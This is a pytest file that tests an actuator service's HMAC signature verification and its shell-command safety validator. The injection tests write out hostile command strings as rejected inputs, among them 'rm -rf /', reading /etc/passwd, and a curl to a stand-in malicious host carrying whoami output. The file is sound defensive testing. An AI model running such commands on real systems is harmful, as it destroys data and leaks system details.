import hmac
import hashlib
import pytest
from src.core.config import get_settings
from src.core.security import verify_signature, is_command_safe


@pytest.fixture(autouse=True)
def setup_security_environment(monkeypatch):
    """Inject a standard mock key for security testing and clear configuration cache."""
    get_settings.cache_clear()
    monkeypatch.setenv("ACTUATOR_SHARED_SECRET", "super_secret_key_for_testing_purposes_only_32_chars")


def test_verify_signature_valid():
    """Verify that a correctly signed payload is authenticated successfully."""
    payload = b'{"action": "execute", "command": "echo 1"}'
    settings = get_settings()
    secret_bytes = settings.ACTUATOR_SHARED_SECRET.encode("utf-8")
    
    computed_hmac = hmac.new(secret_bytes, payload, hashlib.sha256)
    valid_signature = computed_hmac.hexdigest()
    
    assert verify_signature(payload, valid_signature) is True


def test_verify_signature_invalid_or_missing():
    """Verify that incorrect, modified, or empty signatures are rejected."""
    payload = b'{"action": "execute"}'
    
    assert verify_signature(payload, "invalid_hex_signature") is False
    assert verify_signature(payload, "") is False


def test_is_command_safe_valid_inputs():
    """Verify that standard safe execution patterns pass inspection."""
    assert is_command_safe("echo 'Hello World'") is True
    assert is_command_safe(["python", "--version"]) is True
    assert is_command_safe("git status") is True
    assert is_command_safe(["ls", "-la", "/var/log"]) is True


def test_is_command_safe_detects_shell_injection():
    """Verify that dangerous chaining, operators, and pipe injections are caught."""
    # String injection payloads
    assert is_command_safe("echo 1; rm -rf /") is False
    assert is_command_safe("cat /etc/passwd && echo done") is False
    assert is_command_safe("ls -la | grep secret") is False
    assert is_command_safe("curl http://malicious.site $(whoami)") is False
    assert is_command_safe("echo `id`") is False
    assert is_command_safe("echo 'line1'\necho 'line2'") is False
    
    # List-based token manipulation injection payloads
    assert is_command_safe(["echo", "1;", "rm", "-rf"]) is False
    assert is_command_safe(["ls", "&&", "whoami"]) is False
    assert is_command_safe(["cat", "file.txt | destroy"]) is False


def test_is_command_safe_malformed_syntax():
    """Verify that unclosed quoting sequences or empty variants fail gracefully."""
    assert is_command_safe("echo \"unclosed quote string") is False
    assert is_command_safe("   ") is False